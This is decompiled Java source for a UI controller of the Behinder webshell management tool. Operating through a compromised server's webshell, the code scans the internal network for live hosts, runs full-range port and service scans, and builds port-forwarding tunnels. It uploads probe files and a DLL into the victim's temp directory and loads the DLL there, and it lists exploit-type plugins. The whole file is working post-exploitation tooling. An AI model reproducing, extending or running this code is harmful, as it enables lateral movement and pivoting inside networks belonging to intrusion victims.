package net.rebeyond.behinder.ui.controller;

import java.io.ByteArrayInputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.Random;
import java.util.Set;
import java.util.concurrent.ExecutionException;
import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.fxml.FXML;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.Node;
import javafx.scene.control.Alert;
import javafx.scene.control.Button;
import javafx.scene.control.ButtonType;
import javafx.scene.control.ComboBox;
import javafx.scene.control.ContextMenu;
import javafx.scene.control.Label;
import javafx.scene.control.Menu;
import javafx.scene.control.MenuItem;
import javafx.scene.control.OverrunStyle;
import javafx.scene.control.RadioButton;
import javafx.scene.control.ScrollPane;
import javafx.scene.control.SeparatorMenuItem;
import javafx.scene.control.TabPane;
import javafx.scene.control.TableColumn;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.control.TextFormatter;
import javafx.scene.control.ToggleGroup;
import javafx.scene.control.Tooltip;
import javafx.scene.control.Alert.AlertType;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.input.KeyCode;
import javafx.scene.layout.ColumnConstraints;
import javafx.scene.layout.FlowPane;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.scene.layout.StackPane;
import javafx.scene.layout.VBox;
import javafx.stage.Window;
import javafx.util.converter.NumberStringConverter;
import net.rebeyond.behinder.core.Constants;
import net.rebeyond.behinder.core.IShellService;
import net.rebeyond.behinder.core.ShellService;
import net.rebeyond.behinder.dao.BShellDao;
import net.rebeyond.behinder.dao.HostDao;
import net.rebeyond.behinder.dao.PluginDao;
import net.rebeyond.behinder.dao.ServiceDao;
import net.rebeyond.behinder.dao.ShellManager;
import net.rebeyond.behinder.dao.TunnelDao;
import net.rebeyond.behinder.entity.AlreadyExistException;
import net.rebeyond.behinder.entity.BShell;
import net.rebeyond.behinder.entity.Host;
import net.rebeyond.behinder.entity.Plugin;
import net.rebeyond.behinder.entity.Service;
import net.rebeyond.behinder.entity.Tunnel;
import net.rebeyond.behinder.service.ConsoleService;
import net.rebeyond.behinder.service.PluginService;
import net.rebeyond.behinder.service.PluginTask;
import net.rebeyond.behinder.service.Task;
import net.rebeyond.behinder.service.TunnelService;
import net.rebeyond.behinder.service.callback.IPluginCallBack;
import net.rebeyond.behinder.service.callback.ITunnelCallBack;
import net.rebeyond.behinder.utils.Utils;
import org.json.JSONArray;
import org.json.JSONObject;

public class ParallelViewController {
   @FXML
   private FlowPane hostFlowPane;
   @FXML
   private FlowPane serviceFlowPane;
   @FXML
   private MenuItem addHostBtn;
   @FXML
   private MenuItem doScanBtn;
   @FXML
   private MenuItem fastServiceScanBtn;
   @FXML
   private MenuItem custServiceScanBtn;
   @FXML
   private RadioButton hostViewRadio;
   @FXML
   private RadioButton serviceViewRadio;
   @FXML
   private GridPane hostDetailGridPane;
   @FXML
   private GridPane hostListGridPane;
   @FXML
   private GridPane serviceListGridPane;
   @FXML
   private GridPane childMainWindow;
   @FXML
   private GridPane bShellConsoleGridPane;
   @FXML
   private FlowPane serviceDetailFlowPane;
   @FXML
   private FlowPane tunnelFlowPane;
   @FXML
   private FlowPane bShellFlowPane;
   @FXML
   private ScrollPane hostFlowScrollPane;
   @FXML
   private ScrollPane bShellScrollPane;
   @FXML
   private ScrollPane serviceDetailScrollPane;
   @FXML
   private Button returnListBtn;
   @FXML
   private TextField filterTxt;
   @FXML
   private StackPane bShellStackPane;
   @FXML
   private TextArea bShellConsoleTextArea;
   @FXML
   private TableColumn idCol;
   @FXML
   public MainWindowController childMainWindowController;
   private IShellService currentShellService;
   private IShellService currentConsoleShellService;
   private PluginService pluginService;
   private TunnelService tunnelService;
   private ConsoleService consoleService;
   private ShellManager shellManager;
   private JSONObject shellEntity;
   private List workList;
   private List taskList;
   private Map basicInfoMap;
   private Label statusLabel;
   private ContextMenu mainContextMenu;
   private ContextMenu hostContextMenu;
   private ContextMenu serviceContextMenu;
   private ContextMenu bShellContextMenu;
   private ContextMenu tunnelItemContextMenu;
   private ContextMenu tunnelViewContextMenu;
   private PluginViewController pluginViewController;
   private int shellID;
   private HostDao hostDao = new HostDao();
   private ServiceDao serviceDao = new ServiceDao();
   private TunnelDao tunnelDao = new TunnelDao();
   private BShellDao bShellDao = new BShellDao();
   private PluginDao pluginDao = new PluginDao();
   private String defautThreadSize = "500";
   private String probeFilePath = "/tmp/probes.ser";
   private boolean waitReverse;
   private String listenPort;

   public void init(IShellService shellService, PluginViewController pluginViewController, PluginService pluginService, List workList, List taskList, Label statusLabel, ShellManager shellManager, Map basicInfoMap) {
      this.currentShellService = shellService;
      this.pluginViewController = pluginViewController;
      this.pluginService = pluginService;
      this.shellEntity = shellService.getShellEntity();
      this.shellID = this.shellEntity.getInt("id");
      this.shellManager = shellManager;
      this.workList = workList;
      this.taskList = taskList;
      this.basicInfoMap = basicInfoMap;
      this.statusLabel = statusLabel;
      this.tunnelService = new TunnelService(this.currentShellService, this.workList, this.prepareCallBack());
      this.consoleService = new ConsoleService(this.currentShellService, this.shellEntity, this.workList);

      try {
         this.initParaView();
      } catch (Exception var10) {
         var10.printStackTrace();
      }

   }

   private ITunnelCallBack prepareCallBack() {
      ITunnelCallBack callBack = new ITunnelCallBack() {
         public void onInfo(String message) {
            Platform.runLater(() -> {
               ParallelViewController.this.statusLabel.setText(message);
            });
         }

         public void onError(String message) {
            Platform.runLater(() -> {
               ParallelViewController.this.statusLabel.setText(message);
            });
         }
      };
      return callBack;
   }

   private void switchAssetPane(String show) {
      if (show.equals("list")) {
         this.hostListGridPane.setOpacity(1.0);
         this.hostDetailGridPane.setOpacity(0.0);
         this.hostListGridPane.toFront();
      } else if (show.equals("detail")) {
         this.hostListGridPane.setOpacity(0.0);
         this.hostDetailGridPane.setOpacity(1.0);
         this.hostDetailGridPane.toFront();
      }

   }

   private void switchHostPane(String show) {
      if (show.equals("host")) {
         this.hostFlowScrollPane.setOpacity(1.0);
         this.serviceListGridPane.setOpacity(0.0);
         this.hostFlowScrollPane.toFront();
      } else if (show.equals("service")) {
         this.hostFlowScrollPane.setOpacity(0.0);
         this.serviceListGridPane.setOpacity(1.0);
         this.serviceListGridPane.toFront();
      }

   }

   private void switchBShellPane(String show) {
      if (show.equals("console")) {
         this.childMainWindow.setOpacity(0.0);
         this.bShellConsoleGridPane.setOpacity(1.0);
         this.bShellConsoleGridPane.toFront();
      } else if (show.equals("gui")) {
         this.bShellConsoleGridPane.setOpacity(0.0);
         this.childMainWindow.setOpacity(1.0);
         this.childMainWindow.toFront();
      }

   }

   private void refreshScanResult() {
   }

   private void addHosts(String[] ips) {
   }

   private void initProbeFilePath() {
      String osInfo = (String)this.basicInfoMap.get("osInfo");
      if (Utils.getOSType(osInfo) == Constants.OS_TYPE_WINDOWS) {
         this.probeFilePath = "c:/windows/temp/" + Utils.getRandomString(5);
      } else {
         this.probeFilePath = "/tmp/" + Utils.getRandomString(5);
      }

   }

   private void clearHosts() {
      this.hostFlowPane.getChildren().clear();

      try {
         this.hostDao.deleteHostByShellId(this.shellID);
      } catch (Exception var2) {
         var2.printStackTrace();
      }

   }

   private void clearServices() {
      this.serviceFlowPane.getChildren().clear();

      try {
         this.serviceDao.deleteServiceByShellId(this.shellID);
      } catch (Exception var2) {
         var2.printStackTrace();
      }

   }

   private void deleteTunnelBox(Tunnel tunnel) {
      Iterator var2 = this.tunnelFlowPane.getChildren().iterator();

      Node box;
      do {
         if (!var2.hasNext()) {
            return;
         }

         box = (Node)var2.next();
      } while(box.getUserData() != tunnel);

      this.tunnelFlowPane.getChildren().remove(box);
   }

   private void closeTunnel(Tunnel tunnel) {
      String targetIp = tunnel.getTargetIp();
      String targetPort = tunnel.getTargetPort();
      String remoteIp = tunnel.getRemoteIp();
      String remotePort = tunnel.getRemotePort();
      tunnel.setStatus(Constants.TUNNEL_STATUS_DEAD);

      try {
         this.tunnelDao.updateStatus(this.shellID, tunnel);
         this.tunnelService.stoplocalPortMap(remotePort, targetIp, targetPort);
         this.statusLabel.setText("隧道已关闭。");
         this.updateTunnelBox(tunnel);
      } catch (Exception var7) {
         var7.printStackTrace();
      }

   }

   private void openTunnel(Tunnel tunnel) {
      String targetIp = tunnel.getTargetIp();
      String targetPort = tunnel.getTargetPort();
      String remoteIp = tunnel.getRemoteIp();
      String remotePort = tunnel.getRemotePort();

      try {
         tunnel.setStatus(Constants.TUNNEL_STATUS_ALIVE);
         this.tunnelDao.updateStatus(this.shellID, tunnel);
         int type = tunnel.getType();
         if (type == Constants.TUNNEL_TYPE_PORTMAP_LOCAL) {
            this.tunnelService.createLocalPortMap(remoteIp, remotePort, targetIp, targetPort);
         } else if (type == Constants.TUNNEL_TYPE_PORTMAP_REMOTE) {
            this.tunnelService.createRemotePortMap(remoteIp, remotePort, targetIp, targetPort);
         }

         this.updateTunnelBox(tunnel);
      } catch (Exception var7) {
         var7.printStackTrace();
      }

   }

   private void deleteTunnel(Tunnel tunnel) {
      try {
         String targetIp = tunnel.getTargetIp();
         String targetPort = tunnel.getTargetPort();
         String remotePort = tunnel.getRemotePort();
         this.tunnelService.stoplocalPortMap(remotePort, targetIp, targetPort);
         this.tunnelDao.delete(this.shellID, tunnel);
         this.deleteTunnelBox(tunnel);
         this.statusLabel.setText("隧道已删除。");
      } catch (Exception var5) {
         var5.printStackTrace();
      }

   }

   private void initTunnelContextMenu() {
      ContextMenu cm = new ContextMenu();
      MenuItem toggleBtn = new MenuItem("关闭隧道");
      toggleBtn.setOnAction((event) -> {
         Tunnel tunnel = (Tunnel)cm.getUserData();
         String targetIp = tunnel.getTargetIp();
         String targetPort = tunnel.getTargetPort();
         String remoteIp = tunnel.getRemoteIp();
         String remotePort = tunnel.getRemotePort();
         String action = toggleBtn.getUserData().toString();
         if (action.equals("close")) {
            this.closeTunnel(tunnel);
         } else if (action.equals("open")) {
            this.openTunnel(tunnel);
         }

      });
      MenuItem delBtn = new MenuItem("删除隧道");
      delBtn.setOnAction((event) -> {
         Tunnel tunnel = (Tunnel)cm.getUserData();
         this.deleteTunnel(tunnel);
      });
      MenuItem cloneBtn = new MenuItem("克隆隧道……");
      cloneBtn.setOnAction((event) -> {
         Tunnel tunnel = (Tunnel)cm.getUserData();
         String remotePort = Utils.showInputBox("输入", "请输入需要映射到的新端口号", "端口：", "");
         if (remotePort != null && !remotePort.equals("")) {
            String targetIp = tunnel.getTargetIp();
            String targetPort = tunnel.getTargetPort();
            String remoteIp = tunnel.getRemoteIp();
            int type = tunnel.getType();
            if (type == Constants.TUNNEL_TYPE_PORTMAP_LOCAL) {
               this.tunnelService.createLocalPortMap(remoteIp, remotePort, targetIp, targetPort);
            } else if (type == Constants.TUNNEL_TYPE_PORTMAP_REMOTE) {
               this.tunnelService.createRemotePortMap(remoteIp, remotePort, targetIp, targetPort);
            }

            Tunnel newTunnel = new Tunnel();
            newTunnel.setShellId(this.shellID);
            newTunnel.setStatus(Constants.TUNNEL_STATUS_ALIVE);
            newTunnel.setTargetIp(targetIp);
            newTunnel.setTargetPort(targetPort);
            newTunnel.setRemoteIp(remoteIp);
            newTunnel.setRemotePort(remotePort);
            newTunnel.setType(tunnel.getType());

            try {
               this.addTunnel(newTunnel);
               this.statusLabel.setText("隧道克隆成功。");
            } catch (Exception var11) {
               var11.printStackTrace();
            }

         }
      });
      MenuItem reOpenBtn = new MenuItem("换端口重建……");
      reOpenBtn.setOnAction((event) -> {
         Tunnel tunnel = (Tunnel)cm.getUserData();
         String remotePort = Utils.showInputBox("输入", "请输入需要映射到的新端口号", "端口：", "");
         if (remotePort != null && !remotePort.equals("")) {
            try {
               String targetIp = tunnel.getTargetIp();
               String targetPort = tunnel.getTargetPort();
               String remoteIp = tunnel.getRemoteIp();
               String oldRemotePort = tunnel.getRemotePort();
               this.tunnelService.stoplocalPortMap(oldRemotePort, targetIp, targetPort);
               tunnel = this.tunnelDao.findTunnelByShellIdAndTunnel(this.shellID, tunnel);
               this.tunnelDao.updateRemotePort(tunnel.getId(), remotePort);
               tunnel.setRemotePort(remotePort);
               int type = tunnel.getType();
               if (type == Constants.TUNNEL_TYPE_PORTMAP_LOCAL) {
                  this.tunnelService.createLocalPortMap(remoteIp, remotePort, targetIp, targetPort);
               } else if (type == Constants.TUNNEL_TYPE_PORTMAP_REMOTE) {
                  this.tunnelService.createRemotePortMap(remoteIp, remotePort, targetIp, targetPort);
               }

               this.updateTunnelBox(tunnel);
            } catch (Exception var10) {
               var10.printStackTrace();
            }

         }
      });
      cm.getItems().addAll(new MenuItem[]{toggleBtn, delBtn, cloneBtn, reOpenBtn});
      this.tunnelItemContextMenu = cm;
      this.tunnelViewContextMenu = new ContextMenu();
      MenuItem refreshBtn = new MenuItem("刷新");
      refreshBtn.setOnAction((event) -> {
         this.tunnelFlowPane.getChildren().clear();
         this.refreshTunnelFlowView();
      });
      MenuItem closeAllBtn = new MenuItem("全部关闭");
      closeAllBtn.setOnAction((event) -> {
         Iterator var2 = this.tunnelFlowPane.getChildren().iterator();

         while(var2.hasNext()) {
            Node tunnelBox = (Node)var2.next();
            Tunnel tunnel = (Tunnel)tunnelBox.getUserData();
            this.closeTunnel(tunnel);
         }

      });
      MenuItem openAllBtn = new MenuItem("全部打开");
      openAllBtn.setOnAction((event) -> {
         Iterator var2 = this.tunnelFlowPane.getChildren().iterator();

         while(var2.hasNext()) {
            Node tunnelBox = (Node)var2.next();
            Tunnel tunnel = (Tunnel)tunnelBox.getUserData();
            this.openTunnel(tunnel);
         }

      });
      MenuItem clearBtn = new MenuItem("清空隧道");
      clearBtn.setOnAction((event) -> {
         Optional buttonType = Utils.showConfirmMessage("提示", "确认清空所有隧道？");
         if (buttonType.get() == ButtonType.OK) {
            try {
               this.tunnelDao.deleteByShellId(this.shellID);
               this.tunnelFlowPane.getChildren().clear();
               this.statusLabel.setText("隧道已清空。");
            } catch (Exception var4) {
               this.statusLabel.setText("隧道清空失败");
            }

         }
      });
      this.tunnelViewContextMenu.getItems().addAll(new MenuItem[]{refreshBtn, closeAllBtn, openAllBtn, clearBtn});
      this.tunnelFlowPane.setOnContextMenuRequested((event) -> {
         System.out.println(event.getSource());
         this.tunnelViewContextMenu.show(this.tunnelFlowPane.getScene().getWindow(), event.getScreenX(), event.getScreenY());
      });
   }

   private void refreshAllHosts(String ips) {
      this.scanAliveHosts(ips, true);
   }

   private void scanAliveHosts(String ips, boolean needClear) {
      if (needClear) {
         this.clearServices();
         this.clearHosts();
      }

      JSONObject paramObj = new JSONObject();
      paramObj.put("ipList", ips);
      paramObj.put("threadSize", "20");
      final Task scanAliveHostTask = new PluginTask("主机扫描", paramObj);
      IPluginCallBack callBack = new IPluginCallBack() {
         public void onSuccess(String status, String message) {
            while(true) {
               try {
                  JSONObject resultObj;
                  if ((resultObj = ParallelViewController.this.pluginService.getTaskResultSync("CheckAlive")).get("status").equals("success")) {
                     Platform.runLater(() -> {
                        ParallelViewController.this.statusLabel.setText("正在扫描存活主机……");
                     });
                     JSONObject msgObj = resultObj.getJSONObject("msg");
                     String running = msgObj.getString("running");
                     String result = msgObj.getString("result");
                     if (msgObj.has("progress")) {
                        int progress = Integer.parseInt(msgObj.getString("progress"));
                        scanAliveHostTask.update(progress);
                     }

                     String[] var13 = result.split(",");
                     int var8 = var13.length;

                     for(int var9 = 0; var9 < var8; ++var9) {
                        String ip = var13[var9];
                        if (!ip.trim().equals("")) {
                           Platform.runLater(() -> {
                              try {
                                 ParallelViewController.this.addHost(ip);
                                 ParallelViewController.this.statusLabel.setText("正在扫描存活主机……发现主机：" + ip);
                              } catch (Exception var3) {
                                 var3.printStackTrace();
                                 if (!(var3 instanceof AlreadyExistException)) {
                                    var3.printStackTrace();
                                    ParallelViewController.this.statusLabel.setText("主机:" + ip + "添加失败。");
                                 }
                              }

                           });
                        }
                     }

                     if (!running.equals("false")) {
                        Thread.sleep(4000L);
                        continue;
                     }

                     scanAliveHostTask.update(1);
                     ParallelViewController.this.taskList.remove(scanAliveHostTask);
                     Platform.runLater(() -> {
                        ParallelViewController.this.statusLabel.setText("正在扫描存活主机……扫描完成。");
                     });
                  }
               } catch (ExecutionException var11) {
                  var11.printStackTrace();
               } catch (InterruptedException var12) {
                  var12.printStackTrace();
               }

               return;
            }
         }

         public void onFail(String message) {
            Platform.runLater(() -> {
               ParallelViewController.this.statusLabel.setText("fail");
            });
         }
      };

      try {
         this.pluginService.sendTask("CheckAlive", paramObj.toString(), callBack);
         this.statusLabel.setText("正在扫描存活主机……");
         this.taskList.add(scanAliveHostTask);
      } catch (Exception var7) {
         var7.printStackTrace();
      }

   }

   private void scanService(final String hostList, final String portList, final String threadSize) {
      final JSONObject paramObj = new JSONObject();
      paramObj.put("hostList", hostList);
      paramObj.put("portList", portList);
      paramObj.put("probeFilePath", this.probeFilePath);
      paramObj.put("threadSize", threadSize);
      final Task serviceScanTask = new PluginTask("ServiceScan", paramObj);
      final IPluginCallBack callBack = new IPluginCallBack() {
         public void onSuccess(String status, String message) {
            Platform.runLater(() -> {
               ParallelViewController.this.statusLabel.setText("正在进行服务识别……");
            });

            while(true) {
               try {
                  JSONObject resultObj;
                  if ((resultObj = ParallelViewController.this.pluginService.getTaskResultSync("ServiceScan")).get("status").equals("success")) {
                     JSONObject msgObj = resultObj.getJSONObject("msg");
                     String running = msgObj.getString("running");
                     if (msgObj.has("error")) {
                        Platform.runLater(() -> {
                           ParallelViewController.this.statusLabel.setText("正在上传服务识别指纹……");
                        });

                        try {
                           ParallelViewController.this.currentShellService.uploadFile(ParallelViewController.this.probeFilePath, Utils.getResourceData("net/rebeyond/behinder/resource/probes.ser"), true);
                           ParallelViewController.this.scanService(hostList, portList, threadSize);
                        } catch (Exception var15) {
                           var15.printStackTrace();
                        }

                        Platform.runLater(() -> {
                           ParallelViewController.this.statusLabel.setText("服务识别指纹上传完成。");
                        });
                        return;
                     }

                     if (msgObj.has("progress")) {
                        int progress = Integer.parseInt(msgObj.getString("progress"));
                        serviceScanTask.update(progress);
                     }

                     String result = msgObj.getString("result");
                     if (result.trim().equals("")) {
                        Thread.sleep(5000L);
                        continue;
                     }

                     JSONArray serviceArr = new JSONArray(result);
                     Platform.runLater(() -> {
                        ParallelViewController.this.statusLabel.setText("正在进行服务识别……发现服务数量：" + serviceArr.length());
                     });

                     for(int i = 0; i < serviceArr.length(); ++i) {
                        try {
                           JSONObject serviceObj = serviceArr.getJSONObject(i);
                           ParallelViewController.this.decodeEntity(serviceObj);
                           String ip = serviceObj.getString("host");
                           String port = serviceObj.getString("port");
                           String name = serviceObj.optString("service", "unknown");
                           String version = serviceObj.optString("version", "");
                           String banner = serviceObj.optString("banner", "");
                           Platform.runLater(() -> {
                              try {
                                 ParallelViewController.this.addService(ip, port, name, version, banner);
                              } catch (Exception var7) {
                                 var7.printStackTrace();
                              }

                           });
                        } catch (Exception var16) {
                           var16.printStackTrace();
                        }
                     }

                     if (!running.equals("false")) {
                        System.out.println(msgObj);
                        Thread.sleep(4000L);
                        continue;
                     }

                     serviceScanTask.update(1);
                     Platform.runLater(() -> {
                        ParallelViewController.this.statusLabel.setText("正在进行服务识别……扫描完成。");
                     });
                  }
               } catch (Exception var17) {
                  var17.printStackTrace();
               }

               return;
            }
         }

         public void onFail(String message) {
            Platform.runLater(() -> {
               ParallelViewController.this.statusLabel.setText(message);
            });
         }
      };
      this.statusLabel.setText("正在准备服务识别指纹……");
      Runnable runner = new Runnable() {
         public void run() {
            try {
               JSONObject checkExistObj = ParallelViewController.this.currentShellService.checkFileExist(ParallelViewController.this.probeFilePath);
               if (!checkExistObj.getString("status").equals("success")) {
                  if (ParallelViewController.this.shellEntity.getString("type").equals("jsp")) {
                     ParallelViewController.this.currentShellService.uploadFile(ParallelViewController.this.probeFilePath, Utils.getResourceData("net/rebeyond/behinder/resource/probes.ser"), true);
                  } else {
                     ParallelViewController.this.currentShellService.uploadFile(ParallelViewController.this.probeFilePath, Utils.getResourceData("net/rebeyond/behinder/resource/probes.json"), true);
                  }
               }

               if (ParallelViewController.this.shellEntity.getString("type").equals("aspx") && !ParallelViewController.this.currentShellService.checkClassExist("Newtonsoft.Json")) {
                  String targetDllPath = "c:/windows/temp/" + Utils.getRandomString(5);
                  ParallelViewController.this.currentShellService.uploadFile(targetDllPath, Utils.getResourceData("net/rebeyond/behinder/resource/driver/Newtonsoft.Json.dll"), false);
                  Thread.sleep(2000L);
                  ParallelViewController.this.currentShellService.loadJar(targetDllPath);
               }

               ParallelViewController.this.pluginService.sendTask("ServiceScan", paramObj.toString(), callBack);
               ParallelViewController.this.taskList.add(serviceScanTask);
            } catch (Exception var3) {
               var3.printStackTrace();
            }

         }
      };
      (new Thread(runner)).start();
   }

   private void expandHost(String ip) throws Exception {
      Host host = this.hostDao.findHostByShellIdAndIp(this.shellID, ip);
      this.fillHostDetail(host);
      this.loadServices(host);
   }

   private void fillServiceGroup(List serviceList) {
      Map servicePortGroup = new HashMap();
      Map serviceNameGroup = new HashMap();
      Iterator var4 = serviceList.iterator();

      while(var4.hasNext()) {
         Service service = (Service)var4.next();
         String port = service.getPort() + "";
         String name = service.getName();
         int oldNum;
         if (servicePortGroup.containsKey(port)) {
            oldNum = (Integer)servicePortGroup.get(port);
            servicePortGroup.put(port, oldNum + 1);
         } else {
            servicePortGroup.put(port, 1);
         }

         if (serviceNameGroup.containsKey(name)) {
            oldNum = (Integer)serviceNameGroup.get(name);
            serviceNameGroup.put(name, oldNum + 1);
         } else {
            serviceNameGroup.put(name, 1);
         }
      }

      this.fillServiceGroup(servicePortGroup, serviceNameGroup);
   }

   private void loadServices(Host host) throws Exception {
      List serviceList = this.serviceDao.findServiceByHostId(host.getId());
      this.clearServiceDetailBox();
      Iterator var3 = serviceList.iterator();

      while(var3.hasNext()) {
         Service service = (Service)var3.next();
         this.fillServiceBriefList(service);
         this.addServiceDetailBox(service, this.serviceDetailFlowPane, false);
      }

   }

   private void fillServiceBriefList(Service service) {
      VBox serviceBriefBox = (VBox)((ScrollPane)this.hostDetailGridPane.getChildren().get(3)).getContent();
      serviceBriefBox.setAlignment(Pos.TOP_LEFT);
      serviceBriefBox.setPadding(new Insets(10.0));
      Label portItem = new Label();
      portItem.setStyle("-fx-text-fill:#00ff00");
      portItem.setPrefHeight(20.0);
      portItem.setText(service.getPort() + "       " + service.getName());
      portItem.hoverProperty().addListener((observable, oldValue, newValue) -> {
         if (newValue) {
            this.setLabelBackground(portItem);
         } else {
            this.removeLabelBackground(portItem);
         }

      });
      portItem.setOnMouseClicked((event) -> {
         this.scrollToService(service);
      });
      serviceBriefBox.getChildren().add(portItem);
   }

   private void fillServiceGroup(Map servicePortGroup, Map serviceNameGroup) {
      VBox servicePortGroupBox = (VBox)((ScrollPane)this.serviceListGridPane.getChildren().get(2)).getContent();
      servicePortGroupBox.getChildren().clear();
      servicePortGroupBox.setAlignment(Pos.TOP_LEFT);
      servicePortGroupBox.setPadding(new Insets(10.0));
      Iterator var4 = servicePortGroup.keySet().iterator();

      while(var4.hasNext()) {
         String key = (String)var4.next();
         Label portItem = new Label();
         portItem.setStyle("-fx-text-fill:#00ff00");
         portItem.setPrefHeight(20.0);
         portItem.setText(key + "       " + servicePortGroup.get(key));
         portItem.hoverProperty().addListener((observable, oldValue, newValue) -> {
            if (newValue) {
               this.setLabelBackground(portItem);
            } else {
               this.removeLabelBackground(portItem);
            }

         });
         servicePortGroupBox.getChildren().add(portItem);
      }

      VBox serviceNameGroupBox = (VBox)((ScrollPane)this.serviceListGridPane.getChildren().get(1)).getContent();
      serviceNameGroupBox.getChildren().clear();
      serviceNameGroupBox.setAlignment(Pos.TOP_LEFT);
      serviceNameGroupBox.setPadding(new Insets(10.0));
      Iterator var9 = serviceNameGroup.keySet().iterator();

      while(var9.hasNext()) {
         String key = (String)var9.next();
         Label portItem = new Label();
         portItem.setStyle("-fx-text-fill:#00ff00");
         portItem.setPrefHeight(20.0);
         portItem.setText(key + "       " + serviceNameGroup.get(key));
         portItem.hoverProperty().addListener((observable, oldValue, newValue) -> {
            if (newValue) {
               this.setLabelBackground(portItem);
            } else {
               this.removeLabelBackground(portItem);
            }

         });
         serviceNameGroupBox.getChildren().add(portItem);
      }

   }

   private void clearServiceDetailBox() {
      this.serviceDetailFlowPane.getChildren().clear();
      VBox serviceBriefBox = (VBox)((ScrollPane)this.hostDetailGridPane.getChildren().get(3)).getContent();
      serviceBriefBox.getChildren().clear();
   }

   private void scrollToService(Service service) {
      List serviceBoxList = this.serviceDetailFlowPane.getChildren();
      Iterator var3 = serviceBoxList.iterator();

      while(var3.hasNext()) {
         Node node = (Node)var3.next();
         VBox serviceBox = (VBox)node;
         if ((Integer)serviceBox.getUserData() == service.getId()) {
            ensureVisible(this.serviceDetailScrollPane, node);
         }
      }

   }

   private static void ensureVisible(ScrollPane pane, Node node) {
      double height = pane.getContent().getBoundsInLocal().getHeight();
      double y = node.getBoundsInParent().getMaxY();
      if (node.getBoundsInParent().getMinY() == 0.0) {
         y = 0.0;
      }

      pane.setVvalue(y / height);
      node.requestFocus();
   }

   private void loadHosts() throws Exception {
      this.hostFlowPane.getChildren().clear();
      this.loadLocalHost();
      List hostList = this.hostDao.findHostByShellId(this.shellID);
      Iterator var2 = hostList.iterator();

      while(var2.hasNext()) {
         Host host = (Host)var2.next();
         this.addHostBox(host.getIp());
      }

   }

   private void loadHosts(List hostList) throws Exception {
      this.hostFlowPane.getChildren().clear();
      Iterator var2 = hostList.iterator();

      while(var2.hasNext()) {
         Host host = (Host)var2.next();
         this.addHostBox(host.getIp());
      }

   }

   private void loadServices() throws Exception {
      this.serviceFlowPane.getChildren().clear();
      List serviceList = this.serviceDao.findServiceByShellId(this.shellID);
      Iterator var2 = serviceList.iterator();

      while(var2.hasNext()) {
         Service service = (Service)var2.next();
         this.addServiceDetailBox(service, this.serviceFlowPane, true);
      }

      this.fillServiceGroup(serviceList);
   }

   private void loadServices(List serviceList) throws Exception {
      this.serviceFlowPane.getChildren().clear();
      Iterator var2 = serviceList.iterator();

      while(var2.hasNext()) {
         Service service = (Service)var2.next();
         this.addServiceDetailBox(service, this.serviceFlowPane, true);
      }

      this.fillServiceGroup(serviceList);
   }

   private void loadLocalHost() {
      String[] localIpArr = this.getLocalIpArr();
      String[] var2 = localIpArr;
      int var3 = localIpArr.length;

      for(int var4 = 0; var4 < var3; ++var4) {
         String ip = var2[var4];

         try {
            this.addHost(ip);
         } catch (Exception var7) {
         }
      }

   }

   private JSONArray loadPluginList() {
      JSONArray pluginArr = new JSONArray();
      JSONObject pluginScan = new JSONObject();
      pluginScan.put("name", "扫描类");
      pluginScan.put("leaf", "false");
      JSONArray pluginScanArr = new JSONArray();
      pluginScan.put("children", pluginScanArr);
      JSONObject pluginExploit = new JSONObject();
      pluginExploit.put("name", "利用类");
      pluginExploit.put("leaf", "false");
      JSONArray pluginExploitArr = new JSONArray();
      pluginExploit.put("children", pluginExploitArr);
      JSONObject pluginTool = new JSONObject();
      pluginTool.put("name", "工具类");
      pluginTool.put("leaf", "false");
      JSONArray pluginToolArr = new JSONArray();
      pluginTool.put("children", pluginToolArr);
      JSONObject pluginOther = new JSONObject();
      pluginOther.put("name", "其他类");
      pluginOther.put("leaf", "false");
      JSONArray pluginOtherArr = new JSONArray();
      pluginOther.put("children", pluginOtherArr);
      pluginArr.put(Constants.PLUGIN_TYPE_SCAN, pluginScan);
      pluginArr.put(Constants.PLUGIN_TYPE_EXPLOIT, pluginExploit);
      pluginArr.put(Constants.PLUGIN_TYPE_TOOL, pluginTool);
      pluginArr.put(Constants.PLUGIN_TYPE_OTHER, pluginOther);

      try {
         List pluginList = this.pluginDao.findAllPlugins();
         Iterator var11 = pluginList.iterator();

         while(var11.hasNext()) {
            Plugin plugin = (Plugin)var11.next();
            int type = plugin.getType();
            JSONArray children = pluginArr.getJSONObject(type).getJSONArray("children");
            children.put(plugin);
         }
      } catch (Exception var15) {
         var15.printStackTrace();
         this.statusLabel.setText("插件列表初始化失败。");
      }

      return pluginArr;
   }

   private void initParaView() throws Exception {
      this.loadHosts();
      this.loadServices();
      this.switchHostPane("host");
      this.initHostDetail();
      this.initMainContextMenu();
      this.initTunnelContextMenu();
      this.initServiceDetailContextMenu();
      this.initProbeFilePath();
      this.initTunnelFlowView();
      this.initBShellView();
      ToggleGroup group = new ToggleGroup();
      this.hostViewRadio.setToggleGroup(group);
      this.serviceViewRadio.setToggleGroup(group);
      group.selectedToggleProperty().addListener((observable, oldValue, newValue) -> {
         RadioButton radioButton = (RadioButton)newValue;
         if (radioButton.getId().equals("hostViewRadio")) {
            try {
               this.loadHosts();
            } catch (Exception var7) {
               var7.printStackTrace();
            }

            this.switchHostPane("host");
         } else {
            try {
               this.loadServices();
            } catch (Exception var6) {
               var6.printStackTrace();
            }

            this.switchHostPane("service");
         }

      });
      ContextMenu cm = new ContextMenu();
      MenuItem openBtn = new MenuItem("详情");
      openBtn.setOnAction((event) -> {
         String IPAddress = (String)cm.getUserData();

         try {
            this.expandHost(IPAddress);
            this.switchAssetPane("detail");
         } catch (Exception var5) {
            var5.printStackTrace();
            this.statusLabel.setText("主机详情初始化失败。");
         }

      });
      MenuItem scanServiceBtn = new MenuItem("服务扫描");
      scanServiceBtn.setOnAction((event) -> {
         String ip = cm.getUserData().toString();
         this.scanService(ip, "1-65535", this.defautThreadSize);
      });
      Menu bShellMenu = new Menu("BShell");
      MenuItem manualAddBtn = new MenuItem("手动添加...");
      manualAddBtn.setOnAction((event) -> {
         String IPAddress = (String)cm.getUserData();
         this.showAddBShellPane(IPAddress);
      });
